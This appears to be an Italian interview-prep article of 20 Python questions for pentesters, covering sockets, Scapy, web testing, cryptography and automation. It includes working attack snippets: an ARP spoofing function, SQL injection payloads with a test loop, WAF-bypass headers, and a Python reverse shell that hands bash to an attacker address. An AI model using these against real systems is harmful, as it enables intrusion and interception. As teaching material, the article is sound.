---
title: "Python per la Cyber Security: Domande e Risposte per Pentester"
description: "20 domande di colloquio su Python e sicurezza per ruoli di penetration testing e InfoSec. Copre programmazione socket, Scapy, exploitation web, crittografia e scripting di automazione."
date: 2026-02-11
tags: ["python", "interview", "security", "penetration-testing"]
keywords: ["python security interview", "infosec python questions", "scripting for hackers", "python pentest interview", "socket programming interview", "scapy interview questions", "python cryptography", "ethical hacking python", "security automation interview", "python exploit development"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "Python per la Cyber Security: Domande e Risposte per Pentester",
    "description": "20 domande di colloquio su Python e sicurezza che coprono programmazione socket, manipolazione pacchetti, exploitation web e automazione.",
    "proficiencyLevel": "Advanced",
    "inLanguage": "it"
  }
---

## Inizializzazione del Sistema

Python è il linguaggio dominante nella sicurezza offensiva e difensiva. I ruoli di penetration testing, red team, analista SOC e security engineering richiedono tutti padronanza di Python per automazione, sviluppo di strumenti e prototipazione rapida. I colloqui tecnici richiedono di scrivere codice al momento — dai client socket TCP ai crafter di pacchetti agli script di exploit web. Questa guida copre 20 domande che testano l'intersezione tra programmazione Python e conoscenze di sicurezza.

**Hai bisogno di snippet di codice pronti?** Tieni aperto il nostro [Cheatsheet di Scripting Python per la Sicurezza](/cheatsheets/python-security-scripts/) durante la preparazione.

---

## Networking e Socket

<details>
<summary><strong>1. Come si crea un client TCP in Python?</strong></summary>
<br>

```python
import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("target.com", 80))
client.send(b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n")
response = client.recv(4096)
print(response.decode())
client.close()
```

Punti chiave: `AF_INET` = IPv4, `SOCK_STREAM` = TCP. Per UDP, usa `SOCK_DGRAM` e `sendto()`/`recvfrom()` invece di `connect()`/`send()`/`recv()`. Imposta sempre i timeout negli script di produzione: `client.settimeout(5)`.
</details>

<details>
<summary><strong>2. Come funziona il three-way handshake TCP a livello di socket?</strong></summary>
<br>

Quando chiami `client.connect((host, port))`, la libreria socket di Python attiva il sistema operativo per eseguire il three-way handshake:

1. Il SO invia un pacchetto **SYN** al server.
2. Il server risponde con **SYN-ACK**.
3. Il SO invia **ACK** — connessione stabilita, `connect()` ritorna.

Se l'handshake fallisce (porta chiusa, timeout), `connect()` solleva `ConnectionRefusedError` o `socket.timeout`. Con Scapy, puoi creare e inviare manualmente ogni pacchetto per eseguire scansioni SYN stealth — inviando SYN, verificando il SYN-ACK, poi inviando RST invece di ACK per evitare di completare l'handshake.
</details>

<details>
<summary><strong>3. Scrivi un port scanner multi-threaded in Python.</strong></summary>
<br>

```python
import socket
import threading
from queue import Queue

target = "192.168.1.1"
open_ports = []
lock = threading.Lock()
queue = Queue()

def scan(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((target, port))
        s.close()
        if result == 0:
            with lock:
                open_ports.append(port)
    except Exception:
        pass

def worker():
    while not queue.empty():
        scan(queue.get())
        queue.task_done()

for p in range(1, 1025):
    queue.put(p)

for _ in range(100):
    t = threading.Thread(target=worker, daemon=True)
    t.start()

queue.join()
print(f"Open ports: {sorted(open_ports)}")
```

Punti di discussione: Perché i thread e non i processi (I/O bound, non CPU bound), perché `connect_ex` invece di `connect` (ritorna un codice di errore invece di sollevare un'eccezione), e perché `settimeout` è fondamentale (impedisce il blocco su porte filtrate).
</details>

<details>
<summary><strong>4. Qual è la differenza tra `socket.connect()` e `socket.connect_ex()`?</strong></summary>
<br>

- `connect()`: Solleva un'eccezione (`ConnectionRefusedError`, `TimeoutError`) se la connessione fallisce. Adatto per script dove un fallimento deve interrompere l'esecuzione.
- `connect_ex()`: Ritorna un codice di errore invece di sollevare un'eccezione. Ritorna `0` in caso di successo, un errno diverso da zero in caso di fallimento. Migliore per port scanner dove devi controllare centinaia di porte senza l'overhead di try/except.
</details>

## Scapy e Manipolazione dei Pacchetti

<details>
<summary><strong>5. Cos'è Scapy e perché è preferito rispetto ai raw socket?</strong></summary>
<br>

Scapy è una libreria Python per la manipolazione interattiva dei pacchetti. Ti permette di forgiare, inviare, catturare e analizzare pacchetti di rete a qualsiasi livello di protocollo.

Vantaggi rispetto ai raw socket:
- **Costruzione per livelli**: Costruisci pacchetti impilando livelli di protocollo: `IP()/TCP()/Raw()`.
- **Supporto protocolli**: Supporto integrato per centinaia di protocolli (ARP, DNS, ICMP, TCP, UDP, 802.11).
- **Analisi delle risposte**: Abbina automaticamente le richieste alle risposte e le analizza.
- **Modalità interattiva**: REPL per la sperimentazione live dei pacchetti.

I raw socket richiedono la costruzione manuale dei pacchetti a livello di byte e permessi a livello di sistema operativo. Scapy astrae tutto questo fornendo lo stesso livello di controllo.
</details>

<details>
<summary><strong>6. Come si esegue un ARP spoofing con Scapy?</strong></summary>
<br>

```python
from scapy.all import ARP, Ether, sendp

def arp_spoof(target_ip, spoof_ip, target_mac):
    packet = Ether(dst=target_mac) / ARP(
        op=2,  # ARP reply
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip  # Claim to be this IP
    )
    sendp(packet, verbose=0)
```

Questo invia una risposta ARP non sollecitata che dice al target che `spoof_ip` si trova al tuo indirizzo MAC. Il traffico destinato a `spoof_ip` viene reindirizzato alla tua macchina. Combinato con l'IP forwarding, questo abilita attacchi man-in-the-middle.

**Difesa**: Voci ARP statiche, Dynamic ARP Inspection (DAI), o strumenti di monitoraggio ARP come arpwatch.
</details>

<details>
<summary><strong>7. Come si cattura il traffico di rete e si filtrano protocolli specifici?</strong></summary>
<br>

```python
from scapy.all import sniff, TCP, IP

def packet_handler(packet):
    if packet.haslayer(TCP) and packet.haslayer(IP):
        src = packet[IP].src
        dst = packet[IP].dst
        sport = packet[TCP].sport
        dport = packet[TCP].dport
        print(f"{src}:{sport} -> {dst}:{dport}")

# Capture HTTP traffic only
sniff(filter="tcp port 80", prn=packet_handler, count=50, store=0)
```

Il parametro `filter` usa la sintassi BPF (Berkeley Packet Filter). `store=0` impedisce di mantenere i pacchetti in memoria. Richiede privilegi root/admin.
</details>

## Sicurezza Web

<details>
<summary><strong>8. Come si automatizzano le richieste web per il security testing?</strong></summary>
<br>

```python
import requests

session = requests.Session()

# Custom headers to bypass basic WAFs
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "X-Forwarded-For": "127.0.0.1"
})

# Login and maintain session cookies
login_data = {"username": "admin", "password": "test"}
session.post("http://target.com/login", data=login_data)

# Authenticated request (cookies auto-included)
response = session.get("http://target.com/admin/dashboard")
print(response.status_code)
```

Concetti chiave: `Session()` mantiene i cookie tra le richieste. Imposta sempre `timeout` negli script di produzione. Usa `verify=False` solo in ambienti di test controllati (disabilita la verifica SSL).
</details>

<details>
<summary><strong>9. Come testeresti una SQL injection usando Python?</strong></summary>
<br>

```python
import requests

url = "http://target.com/search"
payloads = [
    "' OR 1=1--",
    "' UNION SELECT NULL,NULL--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int,@@version)--"
]

for payload in payloads:
    r = requests.get(url, params={"q": payload}, timeout=10)
    if "error" in r.text.lower() or "sql" in r.text.lower():
        print(f"[!] Possible SQLi with: {payload}")
    if r.elapsed.seconds >= 5:
        print(f"[!] Time-based SQLi confirmed: {payload}")
```

Questo testa SQL injection basata su errori (messaggi di errore nella risposta), basata su union (output alterato) e blind basata sul tempo (risposta ritardata). Per pentest professionali, usa SQLMap — ma i colloqui tecnici richiedono di comprendere i meccanismi sottostanti.
</details>

<details>
<summary><strong>10. Qual è la differenza tra requests.get() e urllib?</strong></summary>
<br>

- **requests**: Libreria di terze parti. API pulita, parsing JSON automatico, gestione sessioni, connection pooling, supporto proxy. Lo standard industriale per HTTP in Python.
- **urllib**: Libreria standard. Più verbosa, di livello inferiore. Nessuna gestione sessioni. Utile quando non puoi installare pacchetti di terze parti (ambienti ristretti, funzioni lambda).

Per il security testing, `requests` è preferito per la sua semplicità. Per lo sviluppo di exploit dove minimizzare le dipendenze è importante, `urllib` o anche i raw socket possono essere migliori.
</details>

## Crittografia

<details>
<summary><strong>11. Qual è la differenza tra hashing e crittografia?</strong></summary>
<br>

- **Hashing**: Funzione unidirezionale. Input → digest di dimensione fissa. Non può essere invertito. Lo stesso input produce sempre lo stesso output. Usato per verifica di integrità, memorizzazione password. Esempi: SHA-256, bcrypt, Argon2.
- **Crittografia**: Funzione bidirezionale. Testo in chiaro → testo cifrato (con una chiave) → testo in chiaro (con la chiave). Progettata per essere invertita dal possessore della chiave. Usata per la riservatezza. Esempi: AES, RSA, ChaCha20.

Errore comune: Usare MD5/SHA per "crittografare" i dati. L'hashing non è crittografia — non puoi recuperare i dati originali da un hash (senza forza bruta).
</details>

<details>
<summary><strong>12. Come si implementa la crittografia AES in Python?</strong></summary>
<br>

```python
from cryptography.fernet import Fernet

# Generate a key (store securely!)
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt
plaintext = b"sensitive data"
ciphertext = cipher.encrypt(plaintext)

# Decrypt
decrypted = cipher.decrypt(ciphertext)
assert decrypted == plaintext
```

Fernet usa AES-128-CBC con HMAC-SHA256 per la crittografia autenticata. Per un controllo di livello inferiore, usa `cryptography.hazmat` con AES-GCM (crittografia autenticata, nessun HMAC separato necessario).

Non implementare mai le tue primitive crittografiche. Usa librerie consolidate.
</details>

<details>
<summary><strong>13. Come si hashano le password in modo sicuro in Python?</strong></summary>
<br>

```python
import bcrypt

# Hash a password
password = b"user_password"
salt = bcrypt.gensalt(rounds=12)
hashed = bcrypt.hashpw(password, salt)

# Verify a password
if bcrypt.checkpw(password, hashed):
    print("Password matches")
```

Perché bcrypt invece di SHA-256: bcrypt è deliberatamente **lento** (rounds configurabili), rendendo gli attacchi a forza bruta impraticabili. SHA-256 è progettato per essere veloce — un attaccante può calcolare miliardi al secondo con le GPU. Alternative: Argon2 (memory-hard, raccomandato per nuovi progetti), PBKDF2 (ampiamente supportato).
</details>

## Automazione e Scripting

<details>
<summary><strong>14. Come si gestisce l'esecuzione di sottoprocessi in modo sicuro in Python?</strong></summary>
<br>

```python
import subprocess

# SECURE: Pass arguments as a list (no shell injection)
result = subprocess.run(
    ["nmap", "-sV", "-p", "80,443", "192.168.1.1"],
    capture_output=True, text=True, timeout=60
)
print(result.stdout)

# INSECURE: Never do this with user input
# subprocess.run(f"nmap {user_input}", shell=True)  # Command injection!
```

Regole: Non usare mai `shell=True` con input controllato dall'utente. Passa sempre i comandi come liste. Imposta `timeout` per prevenire blocchi. Usa `capture_output=True` per raccogliere stdout/stderr.
</details>

<details>
<summary><strong>15. Come si analizzano i file di log con Python?</strong></summary>
<br>

```python
import re
from collections import Counter

failed_logins = Counter()

with open("/var/log/auth.log") as f:
    for line in f:
        match = re.search(r"Failed password .* from (\d+\.\d+\.\d+\.\d+)", line)
        if match:
            failed_logins[match.group(1)] += 1

# Top 10 offending IPs
for ip, count in failed_logins.most_common(10):
    print(f"{ip}: {count} failed attempts")
```

Per file di grandi dimensioni, leggi sempre riga per riga (mai `.read()` dell'intero file in memoria). Usa `re.compile()` per precompilare i pattern regex per le prestazioni.
</details>

<details>
<summary><strong>16. Cos'è il GIL e come influisce sugli strumenti di sicurezza?</strong></summary>
<br>

Il **Global Interpreter Lock (GIL)** impedisce a più thread di eseguire bytecode Python simultaneamente. Solo un thread viene eseguito alla volta in CPython.

Impatto sugli strumenti di sicurezza:
- **Port scanner** (I/O-bound): Il threading funziona bene. I thread passano la maggior parte del tempo in attesa delle risposte di rete, non eseguendo codice Python. Il GIL viene rilasciato durante le operazioni di I/O.
- **Password cracker** (CPU-bound): Il threading è inutile. Usa `multiprocessing` per sfruttare più core della CPU, o usa estensioni C (hashcat, John the Ripper) per il cracking reale.
- **Alternativa**: Usa `asyncio` per strumenti di rete ad alta concorrenza (migliaia di connessioni simultanee con overhead minimo).
</details>

## Sviluppo di Exploit

<details>
<summary><strong>17. Come si crea un payload di reverse shell in Python?</strong></summary>
<br>

```python
import socket, subprocess, os

def reverse_shell(attacker_ip, attacker_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr
    subprocess.call(["/bin/bash", "-i"])
```

Questo reindirizza stdin/stdout/stderr verso un socket TCP, dando all'attaccante una shell interattiva. Durante i colloqui, spiega il concetto e la difesa (filtraggio in uscita, segmentazione di rete, monitoraggio EDR) — non solo il codice. Questo è solo per test autorizzati e sfide CTF.
</details>

<details>
<summary><strong>18. Cos'è la serializzazione e perché rappresenta un rischio di sicurezza?</strong></summary>
<br>

La serializzazione converte gli oggetti in byte per l'archiviazione/trasmissione. La **deserializzazione** di dati non attendibili è una vulnerabilità critica.

```python
import pickle

# DANGEROUS: Never unpickle untrusted data
data = pickle.loads(untrusted_bytes)  # Can execute arbitrary code!
```

Il modulo `pickle` di Python può eseguire codice arbitrario durante la deserializzazione. Un attaccante può creare un payload pickle che genera una reverse shell quando viene caricato.

Alternative sicure: Usa `json` per lo scambio dati (nessuna esecuzione di codice possibile). Se devi deserializzare oggetti complessi, usa la validazione `jsonschema` o protobuf/msgpack con schemi rigidi.
</details>

<details>
<summary><strong>19. Come si interagisce con le API REST per la raccolta OSINT?</strong></summary>
<br>

```python
import requests

# Shodan API - find exposed services
api_key = "YOUR_API_KEY"
target = "8.8.8.8"
response = requests.get(
    f"https://api.shodan.io/shodan/host/{target}",
    params={"key": api_key}
)
data = response.json()

for service in data.get("data", []):
    print(f"Port {service['port']}: {service.get('product', 'unknown')}")
```

API OSINT comuni: Shodan (dispositivi esposti), VirusTotal (analisi malware), Have I Been Pwned (dati di violazioni), SecurityTrails (storico DNS). Rispetta sempre i limiti di frequenza e i termini di servizio.
</details>

<details>
<summary><strong>20. Come si scrive un keylogger in Python e come si rileva?</strong></summary>
<br>

Risposta concettuale (contesto di colloquio):
Un keylogger si aggancia al sistema di input del SO per catturare le sequenze di tasti. Su Linux, legge dai dispositivi `/dev/input/event*`. Su Windows, usa l'API `SetWindowsHookEx` tramite `ctypes` o `pynput`.

**Metodi di rilevamento**:
- Monitora i processi che accedono ai dispositivi di input: `lsof /dev/input/*`.
- Controlla import inattesi di `pynput`, `keyboard` o `ctypes` nei processi Python in esecuzione.
- Firme EDR/antivirus per pattern di keylogger noti.
- Monitoraggio di rete per l'esfiltrazione (i keylogger devono inviare i dati da qualche parte).

Nei colloqui, enfatizza sempre la prospettiva difensiva: come rilevare, prevenire e rispondere ai keylogger — non solo come costruirli.
</details>
